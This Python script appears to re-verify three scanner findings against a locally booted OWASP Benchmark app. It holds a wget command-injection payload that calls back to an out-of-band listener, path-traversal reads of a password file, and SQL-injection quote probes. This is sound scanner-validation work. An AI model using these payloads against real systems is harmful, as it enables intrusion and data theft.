#!/usr/bin/env python3
"""EVIDENCE 3 (order 2026-10-15) — live re-fire of 3 randomly-picked VERIFIED
findings from the preserved trustbound-close merged scan
(benchmark_scan_tb_close.json, 1,498 active ALL VERIFIED).

Pick: random.Random(20261015).sample(verified, 3) — reproducible seed.
  1. F-7c3f927a1a command_injection  GET  /benchmark/cmdi-00/BenchmarkTest00825
     verification: re-test:fresh-interaction-id+alternate-syntax (VR-11:
     twin-env form, curl->wget alternate command, fresh OAST iid)
  2. F-21f73052e3 weak_crypto        POST /benchmark/crypto-00/BenchmarkTest00608
     verification: re-test:fresh-chain (truncate leg 00002 -> write leg 00608
     -> read leg 629; 16B -> 24B + 15B -> 16B off-boundary block multiple)
  3. F-6c950364cc sql_injection      POST /benchmark/sqli-03/BenchmarkTest01625
     verification: error:replay-2variants (base / quote / double-quote; a
     SQL_ERR_PATTERNS string must reproduce)

Each probe prints the COMPLETE request as sent and the COMPLETE response
received — no summarization. The stack (HSQLDB 9001 + LDAP 10389 + Tomcat
8080, BenchmarkJava @ 8b67a88) boots inside this same foreground call.
"""
import base64
import hashlib
import http.client
import json
import re
import subprocess
import sys
import time
import urllib.parse

ENG = "/home/z/my-project/build-v430"
TOOLS = "/home/z/tools"
SRC = f"{TOOLS}/benchmark"
JDK = f"{TOOLS}/jdk-21.0.12.1+1"
CATALINA = f"{TOOLS}/tomcat9"
sys.path.insert(0, ENG)

from sentinel.oast import OastServer          # engine's own local OAST
from sentinel.detect import SQL_ERR_PATTERNS, entity_normalize

OUT = []


def say(*a):
    line = " ".join(str(x) for x in a)
    print(line, flush=True)
    OUT.append(line)


# ---------------------------------------------------------------- boot stack
def boot():
    subprocess.run(["pkill", "-9", "-f", "catalina"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "hsqldb"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "LDAPServer"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "DataBaseServer"], capture_output=True)
    for _ in range(30):
        r = subprocess.run(["ss", "-tln"], capture_output=True, text=True)
        if not re.search(r":(8080|10389|9001) ", r.stdout):
            break
        time.sleep(2)
    subprocess.run([f": > {SRC}/testfiles/passwordFile.txt"], shell=True)
    for f in ("benchmarkDataBase.lck", "benchmarkDataBase.data",
              "benchmarkDataBase.script", "benchmarkDataBase.properties",
              "benchmarkDataBase.tmp"):
        subprocess.run(["rm", "-f", f"{SRC}/{f}"], capture_output=True)
    subprocess.run(["rm", "-f", f"{SRC}/target/db/benchmark.db"], capture_output=True)
    cp = f"{SRC}/target/classes:" + open(f"{SRC}/target/cp.txt").read().strip()
    env = {"JAVA_HOME": JDK, "PATH": f"{JDK}/bin:/usr/bin:/bin",
           "HOME": "/home/z"}
    logd = f"{SRC}/target/logs"
    subprocess.run(["mkdir", "-p", logd, f"{SRC}/target/db"])
    subprocess.Popen([f"{JDK}/bin/java", "-Xmx256m", "-cp", cp, "org.hsqldb.Server",
                      "--database.0", f"file:{SRC}/target/db/benchmark.db",
                      "--dbname.0", "benchmarkDataBase"],
                     cwd=SRC, env=env,
                     stdout=open(f"{logd}/hsqldb.log", "w"),
                     stderr=subprocess.STDOUT)
    time.sleep(3)
    subprocess.Popen([f"{JDK}/bin/java", "-Xmx512m", "-cp", cp,
                      "org.owasp.benchmark.helpers.LDAPServer"],
                     cwd=SRC, env=env,
                     stdout=open(f"{logd}/ldap.log", "w"),
                     stderr=subprocess.STDOUT)
    time.sleep(4)
    env2 = dict(env, CATALINA_HOME=CATALINA, CATALINA_BASE=CATALINA)
    subprocess.Popen([f"{CATALINA}/bin/catalina.sh", "run"], cwd=SRC, env=env2,
                     stdout=open(f"{logd}/tomcat.log", "w"),
                     stderr=subprocess.STDOUT)
    up = "000"
    for i in range(240):
        try:
            c = http.client.HTTPConnection("127.0.0.1", 8080, timeout=3)
            c.request("GET", "/benchmark/Index.html")
            r = c.getresponse()
            r.read()
            up = str(r.status)
            c.close()
            if up == "200":
                break
        except Exception:
            pass
        time.sleep(2)
    say(f"STACK: tomcat={up} (polls={i + 1})")
    if up != "200":
        say("TOMCAT FAILED — abort")
        sys.exit(1)


# ------------------------------------------------------------- http + print
def http_full(method, path, headers=None, body=None, label=""):
    say("")
    say(f"################ {label} ################")
    say("-------------------- REQUEST (as sent) --------------------")
    say(f"{method} {path} HTTP/1.1")
    say(f"Host: 127.0.0.1:8080")
    hdrs = dict(headers or {})
    if body is not None and "Content-Type" not in hdrs:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    if body is not None:
        hdrs["Content-Length"] = str(len(body))
    for k, v in hdrs.items():
        say(f"{k}: {v}")
    say("")
    if body is not None:
        say(body.decode() if isinstance(body, bytes) else body)
    c = http.client.HTTPConnection("127.0.0.1", 8080, timeout=15)
    c.request(method, path, body=body, headers=hdrs)
    r = c.getresponse()
    raw = r.read()
    say("-------------------- RESPONSE (complete) -------------------")
    say(f"HTTP/1.1 {r.status} {r.reason}")
    for k, v in r.getheaders():
        say(f"{k}: {v}")
    say("")
    say(raw.decode("utf-8", "replace"))
    c.close()
    return r.status, raw.decode("utf-8", "replace")


def main():
    boot()

    scan = json.load(open(
        "/home/z/my-project/build-v430/results/owsp/benchmark/benchmark_scan_tb_close.json"))
    act = [f for f in scan["findings"] if f["type"] not in
           ("missing_security_headers", "server_banner_disclosure", "tech_banner")]
    ver = [f for f in act if f.get("status") == "verified"]
    import random
    rng = random.Random(20261015)
    picks = {f["id"]: f for f in rng.sample(ver, 3)}
    say(f"pool: {len(ver)} VERIFIED | seed=20261015 | picks: {list(picks)}")
    say("")

    # ================================================================ 1. cmdi
    f = picks["F-7c3f927a1a"]
    say("==============================================================")
    say(f"FINDING 1/3  {f['id']}  {f['type']}  severity={f['severity']}")
    say(f"recorded: {f['method']} {f['url']}  param={f['parameter']}")
    say(f"recorded verification: {f['verification']['method']}")
    say(f"  notes: {f['verification']['notes']}")
    say("==============================================================")
    oast = OastServer()
    ep_url = "http://localhost:8080/benchmark/cmdi-00/BenchmarkTest00825"
    param = "BenchmarkTest00825"
    # VR-11 fresh verify iid — the engine's deterministic formula (tag=verify)
    iid = "oob-" + hashlib.sha1(
        f"cmdi|{ep_url}|{param}|verify".encode()).hexdigest()[:12]
    payload = f"FOO=wget -q {oast.url(iid)} ;"        # twin-env + wget alternate
    say(f"OAST listener: {oast.public_base} | fresh iid: {iid} "
        f"(recorded close-run iid: oob-8a69bc9df0a2)")
    say(f"probe payload (twin-env form, alternate command): {payload}")
    q = urllib.parse.urlencode({param: payload})
    st, body = http_full("GET",
                         f"/benchmark/cmdi-00/BenchmarkTest00825?{q}",
                         label="1) cmdi live re-fire — GET with FOO=wget twin-env payload")
    hits = oast.poll(iid, timeout=3.0)
    say("")
    say(f"---- OAST interaction record for {iid} (out-of-band receipt) ----")
    say(json.dumps(hits, indent=1) if hits else "NO INTERACTION (timeout)")
    if hits:
        h0 = hits[0]
        ua = h0.get("ua") or h0.get("user_agent") or ""
        say(f"verdict: target executed the fetch out-of-band -> "
            f"passed={'True' if hits else 'False'}"
            f"{f' | fetcher UA: {ua}' if ua else ''}"
            f" | self-callback: no (no redirect chain; fetch came from the target)")

    # ============================================================ 2. crypto
    f = picks["F-21f73052e3"]
    say("")
    say("==============================================================")
    say(f"FINDING 2/3  {f['id']}  {f['type']}  severity={f['severity']}")
    say(f"recorded: {f['method']} {f['url']}")
    say(f"recorded verification: {f['verification']['method']}")
    say(f"  notes: {f['verification']['notes']}")
    say("  chain: truncate leg 00002 (cookie channel) -> write leg 00608 "
        "(form body) -> read leg 629 (query)")
    say("==============================================================")

    def chain_ct(nbytes, tag):
        # truncate leg — POST BenchmarkTest00002, cookie channel, artifact name
        st_t, _ = http_full(
            "POST", "/benchmark/pathtraver-00/BenchmarkTest00002",
            headers={"Cookie": "BenchmarkTest00002=passwordFile.txt"},
            label=f"{tag}a) TRUNCATE leg — POST 00002, Cookie: BenchmarkTest00002=passwordFile.txt")
        # write leg — POST 00608, form body, fresh plaintext
        val = "B" * nbytes
        body_w = urllib.parse.urlencode({"BenchmarkTest00608": val})
        st_w, _ = http_full(
            "POST", "/benchmark/crypto-00/BenchmarkTest00608", body=body_w,
            label=f"{tag}b) WRITE leg — POST 00608, form body BenchmarkTest00608={val}")
        # read leg — GET 629, query channel
        st_r, body_r = http_full(
            "GET",
            "/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=passwordFile.txt",
            label=f"{tag}c) READ leg — GET 629?BenchmarkTest00629=passwordFile.txt")
        norm = entity_normalize(body_r)
        i = norm.find("secret_value=")
        if i < 0:
            return None
        seg = norm[i + len("secret_value="):]
        m = re.search(r"\n\s*\w+=", seg)
        if m:
            seg = seg[:m.start()]
        seg = re.sub(r"\s+", "", seg)
        try:
            return base64.b64decode(seg + "=" * (-len(seg) % 4))
        except Exception:
            return None

    ct16 = chain_ct(16, "2")
    ct15 = chain_ct(15, "3")
    say("")
    say("---- block-oracle re-derivation ----")
    say(f"16-byte plaintext -> ciphertext: {len(ct16) if ct16 else 0} bytes "
        f"({base64.b64encode(ct16).decode()[:32]}…)" if ct16 else
        "16-byte plaintext -> NO CIPHERTEXT")
    if ct15 is not None:
        say(f"15-byte plaintext -> ciphertext: {len(ct15)} bytes "
            f"({base64.b64encode(ct15).decode()[:32]}…)")
    ok = (ct16 is not None and len(ct16) == 24 and ct15 is not None
          and len(ct15) % 8 == 0)
    say(f"verdict: 16B -> {len(ct16) if ct16 else 0}B + 15B -> "
        f"{len(ct15) if ct15 is not None else 0}B off-boundary block multiple "
        f"(8-byte block) reproduced -> passed={ok}")

    # ============================================================== 3. sqli
    f = picks["F-6c950364cc"]
    say("")
    say("==============================================================")
    say(f"FINDING 3/3  {f['id']}  {f['type']}  severity={f['severity']}")
    say(f"recorded: {f['method']} {f['url']}  param={f['parameter']}")
    say(f"recorded verification: {f['verification']['method']}")
    say(f"  notes: {f['verification']['notes']}")
    say("==============================================================")
    base = "1"
    results = {}
    for tag, val in (("base", base), ("quote", base + "'"),
                     ("double-quote", base + '"')):
        body_p = urllib.parse.urlencode({"BenchmarkTest01625": val})
        st, body = http_full(
            "POST", "/benchmark/sqli-03/BenchmarkTest01625", body=body_p,
            label=f"4-{['base', 'quote', 'double-quote'].index(tag) + 1}) "
                  f"sqli replay variant — POST BenchmarkTest01625={val}")
        results[tag] = (st, body)
    say("")
    say("---- error-string re-derivation (SQL_ERR_PATTERNS) ----")
    err_hit = None
    for tag in ("quote", "double-quote"):
        st, body = results[tag]
        for pat in SQL_ERR_PATTERNS:
            mm = pat.search(body)
            if mm:
                err_hit = f"{tag}: /{pat.pattern[:60]}/ matched: {mm.group(0)[:60]}"
                break
        if err_hit:
            break
    say(f"base -> HTTP {results['base'][0]}")
    say(f"quote -> HTTP {results['quote'][0]}")
    say(f"double-quote -> HTTP {results['double-quote'][0]}")
    say(f"error string: {err_hit}")
    say(f"verdict: quote variants reproduce a DB error string -> "
        f"passed={err_hit is not None}")

    open("/home/z/my-project/build-v430/results/owsp/benchmark/"
         "tb_close_evidence/04_live_refire_output.txt", "w").write("\n".join(OUT))


if __name__ == "__main__":
    main()
